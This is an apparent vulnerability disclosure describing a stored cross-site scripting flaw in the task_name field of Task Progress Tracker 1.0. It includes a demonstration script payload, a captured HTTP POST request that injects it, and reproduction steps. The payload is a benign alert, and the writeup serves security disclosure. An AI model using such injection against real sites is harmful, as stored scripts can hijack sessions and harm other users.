# Task Progress Tracker - Stored Cross-Site Scripting(XSS)

#### Exploit Title: Task Progress Tracker - Stored Cross-Site Scripting

#### Exploit Author: [webraybtl@webray.com.cn](mailto:webraybtl@webray.com.cn) inc

#### Vendor Homepage: https://www.sourcecodester.com/php/17479/task-progress-tracker-using-php-and-mysql-source-code.html

#### Software Link:https://www.sourcecodester.com/download-code?nid=17479&title=Task+Progress+Tracker+Using+PHP+and+MySQL+with+Source+Code

#### Version: Task Progress Tracker 1.0

#### Tested on: Windows Server 2008 R2 Enterprise, Apache ,Mysql

#### Description

Persistent XSS (or Stored XSS) attack is one of the three major categories of XSS attacks, the others being Non-Persistent (or Reflected) XSS and DOM-based XSS. In general, XSS attacks are based on the victim’s trust in a legitimate, but vulnerable, website or web application.Task Progress Tracker does not filter the content correctly at the "task_name" parameter, resulting in the generation of stored XSS.

#### Payload used:

`<script>alert("a")</script>`

```
POST http://192.168.67.35:8093/endpoint/add-task.php HTTP/1.1
Host: 192.168.67.35:8093
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 93

task_name=%3Cscript%3Ealert%28%22a%22%29%3C%2Fscript%3E&task_priority=Low&task_status=Pending
```

#### Proof of Concept

1、Visit the website, click on "Add Task", and fill in the xss payload in the "Task Name" field

![image](https://github.com/joinia/webray.com.cn/blob/main/Task-Progress-Tracker/images/xss1.png)

2、After successfully adding, re visiting the page will trigger an XSS pop-up window

![image](https://github.com/joinia/webray.com.cn/blob/main/Task-Progress-Tracker/images/xss2.png)

3、The captured post packet is as follows：

![image](https://github.com/joinia/webray.com.cn/blob/main/Task-Progress-Tracker/images/xss3.png)
